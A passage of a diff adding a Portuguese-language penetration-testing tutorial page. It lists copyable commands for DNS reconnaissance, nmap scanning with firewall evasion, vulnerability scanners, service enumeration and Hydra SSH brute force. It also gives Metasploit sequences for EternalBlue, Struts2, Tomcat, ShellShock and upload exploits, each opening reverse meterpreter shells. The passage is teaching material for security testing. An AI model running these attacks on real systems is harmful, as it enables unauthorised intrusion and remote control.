+                                    <pre><code><span class="command">dnsrecon</span> -d <span class="parameter">exemplo.com</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Tentativa de Transferência de Zona</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">dnsrecon</span> -d <span class="parameter">exemplo.com</span> -t axfr</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Força Bruta de Subdomínios</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">dnsrecon</span> -d <span class="parameter">exemplo.com</span> -t brt -D <span class="parameter">/usr/share/wordlists/seclists/Discovery/DNS/namelist.txt</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Tipos de reconhecimento (<code>-t</code>):</p>
+                            <ul>
+                                <li><code>std</code>: Reconhecimento padrão</li>
+                                <li><code>axfr</code>: Transferência de zona</li>
+                                <li><code>brt</code>: Força bruta</li>
+                                <li><code>snoop</code>: Cache snooping</li>
+                                <li><code>zonewalk</code>: DNSSEC zone walking</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-fingerprint"></i> Fierce</h3>
+                            <p>Ferramenta de reconhecimento de DNS rápida projetada para localizar espaços de IPs não contíguos e hostnames associados a um domínio.</p>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Scan Básico com Fierce</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">fierce</span> --domain <span class="parameter">exemplo.com</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Scan Completo com Wordlist Personalizada</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">fierce</span> --domain <span class="parameter">exemplo.com</span> --subdomain-file <span class="parameter">/usr/share/wordlists/seclists/Discovery/DNS/fierce-hostlist.txt</span> --search <span class="parameter">exemplo</span> --traverse <span class="parameter">10</span> --output <span class="parameter">fierce_results.txt</span></code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="escaneamento" class="content-section">
+                    <h2 class="section-title">Escaneamento e Enumeração</h2>
+                    <p>Após a fase de reconhecimento, passamos ao escaneamento ativo dos alvos identificados para descobrir hosts ativos, portas abertas, serviços em execução e potenciais vulnerabilidades.</p>
+                    
+                    <div class="sub-section">
+                        <h3>Escaneamento de Portas com Nmap</h3>
+                        <p>O Nmap (Network Mapper) é a ferramenta de escaneamento de rede mais popular e versátil, oferecendo inúmeras opções para descoberta de hosts e análise de portas.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-map-marked-alt"></i> Nmap: Técnicas Básicas</h3>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Escaneamento Básico</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">nmap</span> <span class="parameter">192.168.1.1</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Escaneamento de Rede</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">nmap</span> <span class="parameter">192.168.1.0/24</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Escaneamento Rápido</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">nmap</span> -F <span class="parameter">192.168.1.0/24</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Escaneamento Detalhado</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">nmap</span> -p- -sV -sC <span class="parameter">192.168.1.1</span></code></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-map-marked-alt"></i> Nmap: Técnicas Avançadas</h3>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Escaneamento Sigiloso (SYN Scan)</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">nmap</span> -sS -p 1-1000 <span class="parameter">192.168.1.1</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Escaneamento com Scripts NSE</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">nmap</span> --script=vuln <span class="parameter">192.168.1.1</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Evasão de Firewall</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">nmap</span> -f --mtu 16 --data-length 40 -D <span class="parameter">RND:10</span> <span class="parameter">192.168.1.1</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Escaneamento Agressivo Completo</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">nmap</span> -A -T4 -p- -vv -oA <span class="parameter">scan_completo</span> <span class="parameter">192.168.1.1</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Opções comuns:</p>
+                            <ul>
+                                <li><code>-sS</code>: SYN scan (rápido e discreto)</li>
+                                <li><code>-sV</code>: Detecção de versão de serviços</li>
+                                <li><code>-sC</code>: Execução de scripts padrão</li>
+                                <li><code>-O</code>: Detecção de sistema operacional</li>
+                                <li><code>-p-</code>: Escanear todas as 65535 portas</li>
+                                <li><code>-T0</code> a <code>-T5</code>: Velocidade do scan (0=lento, 5=rápido)</li>
+                                <li><code>-oA</code>: Salvar resultados em todos os formatos</li>
+                                <li><code>-vv</code>: Modo muito verboso</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-section">
+                        <h3>Escaneamento de Vulnerabilidades</h3>
+                        <p>Após identificar os serviços em execução, utilizamos scanners de vulnerabilidades para detectar possíveis falhas exploráveis.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-bug"></i> OpenVAS</h3>
+                            <p>OpenVAS (Open Vulnerability Assessment Scanner) é uma suíte completa de ferramentas para escaneamento e gerenciamento de vulnerabilidades.</p>
+                            
+                            <p>Configuração inicial:</p>
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Configuração do OpenVAS</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">gvm-setup</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Iniciar o serviço:</p>
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Iniciar OpenVAS</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">gvm-start</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Para utilizar o OpenVAS:</p>
+                            <ol class="steps-list">
+                                <li>Acesse a interface web em https://localhost:9392</li>
+                                <li>Faça login com as credenciais padrão (admin/admin)</li>
+                                <li>Crie uma nova tarefa de escaneamento</li>
+                                <li>Adicione alvos e configure opções</li>
+                                <li>Execute o scan e analise os resultados</li>
+                            </ol>
+                            
+                            <div class="note-box">
+                                <h4><i class="fas fa-info-circle"></i> Nota</h4>
+                                <p>O OpenVAS requer recursos significativos para execução. Certifique-se de que sua máquina atende aos requisitos mínimos antes de configurá-lo.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-search"></i> Nessus</h3>
+                            <p>Nessus é um dos scanners de vulnerabilidades mais populares e potentes, disponível em versão gratuita (Essentials) e comercial.</p>
+                            
+                            <p>Instalação no Kali Linux:</p>
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Download e Instalação do Nessus</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">wget</span> <span class="parameter">https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads/[VERSION]/download?i_agree_to_tenable_license_agreement=true</span> -O <span class="parameter">nessus.deb</span>
+<span class="command">dpkg</span> -i <span class="parameter">nessus.deb</span>
+<span class="command">systemctl</span> start nessusd</code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Para utilizar o Nessus:</p>
+                            <ol class="steps-list">
+                                <li>Acesse a interface web em https://localhost:8834</li>
+                                <li>Crie uma conta e registre o produto</li>
+                                <li>Aguarde a atualização dos plugins</li>
+                                <li>Crie um novo scan definindo alvos e políticas</li>
+                                <li>Execute o scan e analise os resultados detalhados</li>
+                            </ol>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-section">
+                        <h3>Enumeração de Serviços Específicos</h3>
+                        <p>Dependendo dos serviços encontrados, podemos realizar enumeração específica para obter mais informações.</p>
+                        
+                        <div class="tab-container">
+                            <div class="tab-buttons">
+                                <button class="tab-btn active" data-tab="enum-smb">SMB/NetBIOS</button>
+                                <button class="tab-btn" data-tab="enum-web">Web</button>
+                                <button class="tab-btn" data-tab="enum-snmp">SNMP</button>
+                                <button class="tab-btn" data-tab="enum-ssh">SSH</button>
+                                <button class="tab-btn" data-tab="enum-db">Bancos de Dados</button>
+                            </div>
+                            
+                            <div id="enum-smb-content" class="tab-content active">
+                                <h4>Enumeração SMB/NetBIOS</h4>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Enum4linux</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">enum4linux</span> -a <span class="parameter">192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">SMBMap</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">smbmap</span> -H <span class="parameter">192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">SMBMap com Credenciais</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">smbmap</span> -H <span class="parameter">192.168.1.100</span> -u <span class="parameter">usuario</span> -p <span class="parameter">senha</span> -d <span class="parameter">dominio</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">NBTScan</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">nbtscan</span> <span class="parameter">192.168.1.0/24</span></code></pre>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div id="enum-web-content" class="tab-content">
+                                <h4>Enumeração Web</h4>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Nikto</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">nikto</span> -h <span class="parameter">http://192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Nikto com Opções Avançadas</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">nikto</span> -h <span class="parameter">http://192.168.1.100</span> -ssl -C all -o <span class="parameter">nikto_resultado.html</span> -Format htm</code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Dirsearch</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">dirsearch</span> -u <span class="parameter">http://192.168.1.100</span> -e <span class="parameter">php,asp,aspx,jsp,html,txt</span> -x <span class="parameter">403,404</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">WPScan (WordPress)</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">wpscan</span> --url <span class="parameter">http://192.168.1.100</span> --enumerate u,vp,vt</code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Whatweb</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">whatweb</span> -a 3 <span class="parameter">http://192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div id="enum-snmp-content" class="tab-content">
+                                <h4>Enumeração SNMP</h4>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Verificação de Community Strings</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">onesixtyone</span> -c <span class="parameter">/usr/share/doc/onesixtyone/dict.txt</span> <span class="parameter">192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">SNMPwalk Básico</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">snmpwalk</span> -c <span class="parameter">public</span> -v1 <span class="parameter">192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">SNMPwalk para Usuários</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">snmpwalk</span> -c <span class="parameter">public</span> -v1 <span class="parameter">192.168.1.100</span> 1.3.6.1.4.1.77.1.2.25</code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">SNMPwalk para Processos</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">snmpwalk</span> -c <span class="parameter">public</span> -v1 <span class="parameter">192.168.1.100</span> 1.3.6.1.2.1.25.4.2.1.2</code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">SNMPwalk para Portas Abertas</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">snmpwalk</span> -c <span class="parameter">public</span> -v1 <span class="parameter">192.168.1.100</span> 1.3.6.1.2.1.6.13.1.3</code></pre>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div id="enum-ssh-content" class="tab-content">
+                                <h4>Enumeração SSH</h4>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Verificação da Versão</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">nmap</span> -p 22 -sV <span class="parameter">192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Detecção de Algoritmos</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">nmap</span> --script ssh2-enum-algos -p 22 <span class="parameter">192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Verificação de Autenticação por Chave</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">nmap</span> --script ssh-hostkey -p 22 <span class="parameter">192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Força Bruta de Usuários</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">nmap</span> --script ssh-auth-methods --script-args="ssh.user=root" -p 22 <span class="parameter">192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Hydra para Força Bruta</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">hydra</span> -L <span class="parameter">usuarios.txt</span> -P <span class="parameter">senhas.txt</span> <span class="parameter">192.168.1.100</span> ssh</code></pre>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div id="enum-db-content" class="tab-content">
+                                <h4>Enumeração de Bancos de Dados</h4>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">MySQL</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">nmap</span> --script=mysql-* -p 3306 <span class="parameter">192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Conexão MySQL</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">mysql</span> -h <span class="parameter">192.168.1.100</span> -u <span class="parameter">root</span> -p</code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">MSSQL</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">nmap</span> --script=ms-sql-* -p 1433 <span class="parameter">192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">PostgreSQL</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">nmap</span> --script=pgsql-* -p 5432 <span class="parameter">192.168.1.100</span></code></pre>
+                                    </div>
+                                </div>
+                                
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-title">Conexão PostgreSQL</span>
+                                        <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                    <div class="code-content">
+                                        <pre><code><span class="command">psql</span> -h <span class="parameter">192.168.1.100</span> -U <span class="parameter">postgres</span></code></pre>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="exploracao" class="content-section">
+                    <h2 class="section-title">Exploração de Vulnerabilidades</h2>
+                    <p>Após identificar vulnerabilidades potenciais, podemos utilizar ferramentas específicas para explorar essas falhas e obter acesso aos sistemas.</p>
+                    
+                    <div class="sub-section">
+                        <h3>Metasploit Framework</h3>
+                        <p>O Metasploit Framework é a ferramenta de exploração mais completa e popular, oferecendo centenas de módulos para explorar vulnerabilidades conhecidas.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-crosshairs"></i> Metasploit: Comandos Básicos</h3>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Iniciar Metasploit</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">msfconsole</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Buscar Exploits</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">search</span> <span class="parameter">apache</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Usar um Módulo</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">use</span> <span class="parameter">exploit/windows/smb/ms17_010_eternalblue</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Mostrar Opções</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">show options</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Configurar Opções</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> LHOST <span class="parameter">192.168.1.10</span>
+<span class="command">set</span> LPORT <span class="parameter">4444</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Executar Exploit</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">run</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Verificar Sessões</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">sessions</span> -l</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Interagir com Sessão</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">sessions</span> -i <span class="parameter">1</span></code></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-crosshairs"></i> Metasploit: Ataques Específicos</h3>
+                            
+                            <div class="tab-container">
+                                <div class="tab-buttons">
+                                    <button class="tab-btn active" data-tab="msf-web">Web</button>
+                                    <button class="tab-btn" data-tab="msf-smb">SMB</button>
+                                    <button class="tab-btn" data-tab="msf-remote">RCE</button>
+                                    <button class="tab-btn" data-tab="msf-passwd">Password Attacks</button>
+                                </div>
+                                
+                                <div id="msf-web-content" class="tab-content active">
+                                    <h4>Exploits Web</h4>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">Exploit Struts2</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> exploit/multi/http/struts2_content_type_ognl
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> RPORT <span class="parameter">8080</span>
+<span class="command">set</span> TARGETURI <span class="parameter">/struts2-showcase/</span>
+<span class="command">set</span> PAYLOAD <span class="parameter">java/meterpreter/reverse_tcp</span>
+<span class="command">set</span> LHOST <span class="parameter">192.168.1.10</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">Exploit Tomcat</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> exploit/multi/http/tomcat_mgr_upload
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> RPORT <span class="parameter">8080</span>
+<span class="command">set</span> HttpUsername <span class="parameter">tomcat</span>
+<span class="command">set</span> HttpPassword <span class="parameter">tomcat</span>
+<span class="command">set</span> PAYLOAD <span class="parameter">java/meterpreter/reverse_tcp</span>
+<span class="command">set</span> LHOST <span class="parameter">192.168.1.10</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">SQL Injection</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> auxiliary/scanner/http/sql_injection
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> RPORT <span class="parameter">80</span>
+<span class="command">set</span> PATH <span class="parameter">/vulnerable.php</span>
+<span class="command">set</span> GET_PARAMS <span class="parameter">id=1</span>
+<span class="command">set</span> INJECTION_POINT <span class="parameter">id</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div id="msf-smb-content" class="tab-content">
+                                    <h4>Exploits SMB</h4>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">EternalBlue (MS17-010)</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> exploit/windows/smb/ms17_010_eternalblue
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> PAYLOAD <span class="parameter">windows/x64/meterpreter/reverse_tcp</span>
+<span class="command">set</span> LHOST <span class="parameter">192.168.1.10</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">PsExec</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> exploit/windows/smb/psexec
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> SMBDomain <span class="parameter">WORKGROUP</span>
+<span class="command">set</span> SMBUser <span class="parameter">Administrador</span>
+<span class="command">set</span> SMBPass <span class="parameter">Senha123</span>
+<span class="command">set</span> PAYLOAD <span class="parameter">windows/meterpreter/reverse_tcp</span>
+<span class="command">set</span> LHOST <span class="parameter">192.168.1.10</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">Verificar MS17-010</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> auxiliary/scanner/smb/smb_ms17_010
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div id="msf-remote-content" class="tab-content">
+                                    <h4>Execução Remota de Código</h4>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">ShellShock</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> exploit/multi/http/apache_mod_cgi_bash_env_exec
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> TARGETURI <span class="parameter">/cgi-bin/vuln.cgi</span>
+<span class="command">set</span> PAYLOAD <span class="parameter">linux/x86/meterpreter/reverse_tcp</span>
+<span class="command">set</span> LHOST <span class="parameter">192.168.1.10</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">PHP File Upload</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> exploit/unix/webapp/php_file_upload
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> RPORT <span class="parameter">80</span>
+<span class="command">set</span> UPLOADPATH <span class="parameter">/upload.php</span>
+<span class="command">set</span> PAYLOAD <span class="parameter">php/meterpreter/reverse_tcp</span>
+<span class="command">set</span> LHOST <span class="parameter">192.168.1.10</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">WebDAV Upload</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> exploit/windows/iis/iis_webdav_upload_asp
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> PATH <span class="parameter">/webdav/</span>
+<span class="command">set</span> PAYLOAD <span class="parameter">windows/meterpreter/reverse_tcp</span>
+<span class="command">set</span> LHOST <span class="parameter">192.168.1.10</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div id="msf-passwd-content" class="tab-content">
